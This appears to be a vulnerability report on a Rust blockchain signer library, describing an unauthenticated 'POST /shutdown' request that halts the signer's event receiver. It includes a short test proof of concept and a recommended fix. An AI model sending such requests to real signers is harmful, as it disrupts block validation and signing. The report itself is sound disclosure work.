### Title
Unauthenticated remote shutdown of `SignerEventReceiver` via `POST /shutdown` - (File: `libsigner/src/events.rs`)

### Summary
`SignerEventReceiver::next_event` dispatches solely on the raw `request.url()` string with no authentication of the connecting peer, and when the URL equals `/shutdown` it unconditionally sets the stop flag and returns `EventError::Terminated`. Any TCP client that can reach the signer's bound event-listener port can send this single POST request and permanently halt the signer's event loop.

### Finding Description
In `SignerEventReceiver::next_event` [1](#0-0) , the request is accepted from `http_server.recv()` and dispatched purely by URL string comparison with no check of the requester's identity, source IP, or any shared secret. The `/shutdown` branch performs the terminating action unconditionally: [2](#0-1) 
This exactly matches the internal shutdown mechanism used by `SignerStopSignaler::send`, which itself just opens a plain TCP connection and issues `POST /shutdown` with an arbitrary body [3](#0-2) , confirming there is no authentication layer expected or enforced for this endpoint — it's identical to what any external TCP peer could replay. There is no signature check, no secret comparison, and no origin/loopback restriction anywhere in `next_event` or in `SignerEventReceiver::bind` [4](#0-3) .

### Impact Explanation
Any party able to open a TCP connection to the signer's event-receiver listening socket can send one crafted HTTP POST to permanently set `stop_signal`, after which `is_stopped()` returns true and every subsequent call to `next_event()` immediately returns `Err(EventError::Terminated)` [5](#0-4) , halting the signer's consumption of `/stackerdb_chunks`, `/proposal_response`, `/new_burn_block`, and `/new_block` events from its paired stacks-node. This is a single-message, unauthenticated denial-of-service that disables the signer's participation in block validation/signing until manually restarted, matching the "Critical - remote crash/unauthenticated DoS from few messages" category.

### Likelihood Explanation
Exploitability depends entirely on whether the signer's event listener is reachable by the attacker. In the sample/test configs the endpoint is configurable (`endpoint = ...`) and is the address the local `stacks-node` event-observer posts to; if an operator binds it to a non-loopback interface (e.g., `0.0.0.0` or a routable IP, as opposed to `127.0.0.1`) it becomes remotely reachable by any unprivileged network peer with zero cost — no key, no secret, no StackerDB slot ownership required. I could not fully confirm from the indexed config files whether the default/documented binding is always loopback-only in this repo snapshot; this affects the "remote reachability" precondition and should be verified against the actual deployed configuration and documentation.

### Recommendation
Add authentication to the event-receiver HTTP endpoint (e.g., a shared secret/bearer token configured between the node and signer, checked via a header before dispatching any action), and/or restrict the listener to bind only to loopback/trusted interfaces by default, rejecting connections from non-local peers before processing `/shutdown` or any other control endpoint.

### Proof of Concept
```rust
// libsigner/src/events.rs (test)
use std::net::TcpStream;
use std::io::Write;

#[test]
fn unauthenticated_remote_shutdown() {
    let mut receiver = SignerEventReceiver::new(/* is_mainnet */ false);
    let addr = receiver.bind("127.0.0.1:0".parse().unwrap()).unwrap();

    // Spawn next_event in a thread so it blocks on recv()
    let handle = std::thread::spawn(move || receiver.next_event());

    // Attacker: no auth, no signature, arbitrary body
    let mut stream = TcpStream::connect(addr).unwrap();
    let body = "";
    let req = format!(
        "POST /shutdown HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}",
        body.len(), body
    );
    stream.write_all(req.as_bytes()).unwrap();

    let result = handle.join().unwrap();
    assert!(matches!(result, Err(EventError::Terminated)));
    // subsequent calls also fail immediately, confirming permanent shutdown
}
```
This directly exercises the `request.url() == "/shutdown"` branch at `libsigner/src/events.rs:443-445` with no credentials, demonstrating the unauthenticated remote DoS.

### Citations

**File:** libsigner/src/events.rs (L376-396)
```rust
impl EventStopSignaler for SignerStopSignaler {
    #[cfg_attr(test, mutants::skip)]
    fn send(&mut self) {
        self.stop_signal.store(true, Ordering::SeqCst);
        // wake up the thread so the atomicbool can be checked
        // This makes me sad...but for now...it works.
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
        }
    }
}
```

**File:** libsigner/src/events.rs (L404-408)
```rust
    fn bind(&mut self, listener: SocketAddr) -> Result<SocketAddr, EventError> {
        self.http_server = Some(HttpServer::http(listener).expect("failed to start HttpServer"));
        self.local_addr = Some(listener);
        Ok(listener)
    }
```

**File:** libsigner/src/events.rs (L413-428)
```rust
    fn next_event(&mut self) -> Result<SignerEvent<T>, EventError> {
        self.with_server(|event_receiver, http_server, _is_mainnet| {
            // were we asked to terminate?
            if event_receiver.is_stopped() {
                return Err(EventError::Terminated);
            }
            debug!("Request handling");
            let request = http_server.recv()?;
            debug!("Got request"; "method" => %request.method(), "path" => request.url());

            if request.url() == "/status" {
                request
                .respond(HttpResponse::from_string("OK"))
                .expect("response failed");
                return Ok(SignerEvent::StatusCheck);
            }
```

**File:** libsigner/src/events.rs (L443-445)
```rust
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
```
